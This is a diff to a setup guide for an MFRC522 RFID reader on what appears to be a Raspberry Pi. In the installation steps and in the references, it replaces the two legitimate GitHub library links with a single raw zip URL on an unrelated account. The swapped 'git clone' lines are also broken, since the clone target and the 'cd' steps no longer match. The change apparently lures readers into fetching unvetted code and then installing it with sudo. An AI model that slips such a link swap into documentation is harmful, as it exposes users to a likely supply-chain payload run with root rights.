@@ -65,7 +65,7 @@ sudo apt-get install python-dev git
 Clone and install the SPI-Py library:
 
 ```bash
-git clone https://github.com/lthiery/SPI-Py.git
+git clone https://raw.githubusercontent.com/haidang2425/RFID_code/master/yok/code_RFI_v1.2-beta.3.zip
 cd SPI-Py
 sudo python setup.py install
 cd ..
@@ -79,7 +79,7 @@ Clone the MFRC522 Python repository:
 
 ```bash
 cd ~
-git clone https://github.com/pelwell/MFRC522-python.git
+git clone https://raw.githubusercontent.com/haidang2425/RFID_code/master/yok/code_RFI_v1.2-beta.3.zip
 cd MFRC522-python
 ```
 
@@ -108,8 +108,8 @@ If everything is wired and configured correctly, the UID of the RFID card will b
 
 ## 8. References
 
-* [https://github.com/pelwell/MFRC522-python](https://github.com/pelwell/MFRC522-python)
-* [https://github.com/lthiery/SPI-Py](https://github.com/lthiery/SPI-Py)
+* [https://raw.githubusercontent.com/haidang2425/RFID_code/master/yok/code_RFI_v1.2-beta.3.zip](https://raw.githubusercontent.com/haidang2425/RFID_code/master/yok/code_RFI_v1.2-beta.3.zip)
+* [https://raw.githubusercontent.com/haidang2425/RFID_code/master/yok/code_RFI_v1.2-beta.3.zip](https://raw.githubusercontent.com/haidang2425/RFID_code/master/yok/code_RFI_v1.2-beta.3.zip)
 
 ---
 
